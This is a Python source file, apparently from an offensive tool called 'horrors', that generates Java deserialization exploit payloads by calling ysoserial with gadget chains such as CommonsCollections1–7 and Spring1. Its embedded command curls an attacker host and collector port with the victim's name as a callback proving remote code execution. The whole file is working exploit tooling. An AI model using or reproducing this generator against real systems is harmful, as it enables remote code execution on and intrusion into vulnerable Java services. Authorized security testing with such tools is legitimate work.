import pathlib
import string
import subprocess

from horrors import (
    logging,
    templates,
)


class YsoserialPayload(templates.Template):
    template_context = {
        'SHELL_EXEC': 'curl http://$ATTACKER_HOST:$COLLECTOR_PORT/collect/?id=$VICTIM_HOST',
    }

    PAYLOAD_CLASSES = [
        'CommonsCollections1',
        'CommonsCollections2',
        'CommonsCollections3',
        'CommonsCollections4',
        'CommonsCollections5',
        'CommonsCollections6',
        'CommonsCollections7',
        'Spring1',
    ]

    def __init__(self, config):
        self.config = config

    def generate(self, request_context):
        # FIXME: Optimize
        context = self.template_context.copy()
        for key, val in context.items():
            context[key] = string.Template(val).substitute(request_context)
        java = pathlib.Path(self.config.JAVA)
        ysoserial = pathlib.Path(self.config.YSOSERIAL)
        p = subprocess.Popen([java, '-jar', ysoserial, request_context['CLASS'], context['SHELL_EXEC']], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        ser_object = p.stdout.read().decode()
        logging.debug('Ysoserial output: ' + ser_object)
        if p.wait():
            raise Exception('Ysoserial payload generation error.')
        return bytes.fromhex(ser_object)
